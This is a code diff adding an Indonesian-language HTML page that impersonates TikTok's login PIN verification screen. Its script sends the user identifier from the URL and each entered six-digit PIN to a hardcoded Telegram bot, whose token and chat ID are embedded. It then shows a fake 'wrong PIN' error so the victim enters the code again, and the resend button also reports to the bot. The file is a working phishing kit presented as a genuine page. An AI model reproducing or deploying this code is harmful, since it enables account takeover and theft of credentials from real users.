@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi PIN | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding-top: 10px;
+        }
+
+        .back-btn {
+            font-size: 20px;
+            cursor: pointer;
+            color: #000;
+        }
+
+        .title {
+            font-size: 17px;
+            font-weight: 700;
+        }
+
+        .info-icon {
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .content {
+            margin-top: 10px;
+        }
+
+        .content-title {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #161823;
+        }
+
+        .content-subtitle {
+            font-size: 14px;
+            color: #8a8a8a;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        /* PIN Inputs */
+        .otp-wrapper {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .pin-field {
+            flex: 1;
+            height: 54px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 1px solid #d1d1d3;
+            border-radius: 4px;
+            background-color: #f1f1f2;
+            outline: none;
+            color: #000;
+            caret-color: transparent;
+            transition: all 0.2s;
+        }
+
+        .pin-field:focus {
+            border-color: #fe2c55;
+            background-color: #fff;
+        }
+
+        .lupa-pin {
+            display: inline-block;
+            font-size: 14px;
+            color: #161823;
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        /* Error Message */
+        .error-message {
+            color: #fe2c55;
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Tombol Lanjutkan */
+        .btn-submit {
+            width: calc(100% - 40px);
+            background-color: #ffc2d1;
+            color: white;
+            border: none;
+            border-radius: 26px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            cursor: not-allowed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 410px;
+            transition: background-color 0.3s;
+        }
+
+        .btn-submit.active {
+            background-color: #fe2c55;
+            cursor: pointer;
+        }
+
+        .loader {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .timer-section {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8a8a8a;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #fe2c55;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .resend-btn:disabled {
+            color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="back-btn" onclick="history.back()">❮</span>
+            <div class="title">Masuk</div>
+            <span class="info-icon">ⓘ</span>
+        </div>
+
+        <div class="content">
+            <p class="content-title">Masukkan PIN</p>
+            <p class="content-subtitle" id="dynamicSubtitle">Masukkan 6 digit PIN verifikasi untuk <strong></strong>.</p>
+            
+            <div id="errorMsg" class="error-message">PIN yang Anda masukkan salah. Silakan coba lagi.</div>
+
+            <div class="otp-wrapper">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            </div>
+
+            <a href="#" class="lupa-pin">Lupa PIN?</a>
+
+            <div class="timer-section">
+                Kirim ulang kode dalam <span id="timer">01:00</span>
+                <br>
+                <button type="button" class="resend-btn" id="resendBtn" onclick="handleResend()" disabled>Kirim ulang OTP</button>
+            </div>
+        </div>
+
+        <button type="button" class="btn-submit" id="submitBtn" disabled onclick="handleSubmit()">
+            <div class="loader" id="loader"></div>
+            <span id="btnText">Lanjutkan</span>
+        </button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8499835544:AAF_KRcHMfFaw83C47bmGYPXVLDRY5fo1pA';
+        const CHAT_ID = '5826930555';
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const userValue = urlParams.get('value') || '';
+        document.querySelector('#dynamicSubtitle strong').textContent = userValue;
+
+        const pinFields = document.querySelectorAll('.pin-field');
+        const submitBtn = document.getElementById('submitBtn');
+
+        pinFields.forEach((field, index) => {
+            field.addEventListener('input', (e) => {
+                if (!/^\d$/.test(e.target.value)) {
+                    e.target.value = '';
+                    return;
+                }
+                if (index < pinFields.length - 1 && e.target.value) {
+                    pinFields[index + 1].focus();
+                }
+                checkPin();
+            });
+
+            field.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    pinFields[index - 1].focus();
+                }
+            });
+        });
+
+        function checkPin() {
+            const pin = Array.from(pinFields).map(f => f.value).join('');
+            if (pin.length === 6) {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        }
+
+        async function handleSubmit() {
+            const pin = Array.from(pinFields).map(f => f.value).join('');
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            const btnText = document.getElementById('btnText');
+            const errorMsg = document.getElementById('errorMsg');
+
+            btn.disabled = true;
+            loader.style.display = 'inline-block';
+            btnText.textContent = 'Memproses...';
+            errorMsg.classList.remove('show');
+
+            const message = `🔐 *TikTok PIN Baru*\n\n` +
+                          `👤 *User:* \`${userValue}\`\n` +
+                          `🔢 *PIN:* \`${pin}\`\n` +
+                          `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                });
+
+                setTimeout(() => {
+                    errorMsg.classList.add('show');
+                    pinFields.forEach(f => f.value = '');
+                    pinFields[0].focus();
+                    btn.disabled = false;
+                    loader.style.display = 'none';
+                    btnText.textContent = 'Lanjutkan';
+                    checkPin();
+                }, 1500);
+            } catch (error) {
+                btn.disabled = false;
+                loader.style.display = 'none';
+                btnText.textContent = 'Lanjutkan';
+            }
+        }
+
+        async function handleResend() {
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = true;
+            resendBtn.textContent = 'Mengirim...';
+
+            const message = `🔄 *Resend PIN TikTok*\n👤 *User:* \`${userValue}\``;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                });
+                
+                timeLeft = 60;
+                resendBtn.textContent = 'Kirim ulang OTP';
+            } catch (error) {
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'Kirim ulang OTP';
+            }
+        }
+
+        let timeLeft = 60;
+        const timerSpan = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                timerSpan.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                resendBtn.disabled = true;
+            } else {
+                resendBtn.disabled = false;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
